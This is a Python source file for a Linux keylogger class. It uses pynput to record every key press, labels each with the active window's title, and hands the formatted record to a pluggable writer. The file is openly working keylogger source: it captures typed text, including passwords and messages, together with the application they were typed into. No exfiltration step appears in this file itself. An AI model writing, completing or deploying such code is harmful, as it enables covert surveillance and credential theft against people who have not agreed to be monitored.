from pynput import keyboard
from typing import List
from interfaces.i_writer import IWriter
from interfaces.i_key_logger import IKeyLogger
from factories.window_title_factory import WindowTitleFactory
import re

class LinuxKeyLogger(IKeyLogger):
    def __init__(self, writer: IWriter):
        self.writer = writer
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.logged_keys: List[str] = []
        self.window_title_service = WindowTitleFactory.create_window_title()
        self.current_window = "Unknown"
        
    def clean_window_title(self, title: str) -> str:
        """Remove special characters and normalize the window title"""
        # Remove Right-to-Left and Left-to-Right marks and other special characters
        clean_title = re.sub(r'[\u200e\u200f\u202a\u202b\u202c\u202d\u202e]', '', title)
        # Remove multiple spaces
        clean_title = ' '.join(clean_title.split())
        return clean_title
        
    def format_key_press(self, key_str: str) -> str:
        clean_window = self.clean_window_title(self.current_window)
        return f"[Window: {clean_window}] Key: {key_str}\n"

    def on_press(self, key):
        """callback function that is called when a key is pressed"""
        try:
            # Update current window title
            self.current_window = self.window_title_service.get_active_window_title()
            
            # Get the key string
            key_str = str(key.char)  # Regular characters including Hebrew
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: "BACKSPACE",
                keyboard.Key.shift: "SHIFT",
                keyboard.Key.ctrl_l: "CTRL_L",
                keyboard.Key.ctrl_r: "CTRL_R",
                keyboard.Key.alt_l: "ALT_L",
                keyboard.Key.alt_r: "ALT_R",
                keyboard.Key.tab: "TAB",
                keyboard.Key.esc: "ESCAPE"
            }
            key_str = special_keys.get(key, str(key)) # convert special keys to string
             
        # Format and write the key press with window information
        formatted_output = self.format_key_press(key_str)
        self.writer.write(formatted_output)
        self.logged_keys.append(key_str)
        
    def on_release(self, key):
        """callback function that is called when a key is released"""
        if key == keyboard.Key.esc:
            return False  # stop listener

    def start(self):
        self.listener.start()
        self.listener.join()

    def stop(self):
        self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        return self.logged_keys
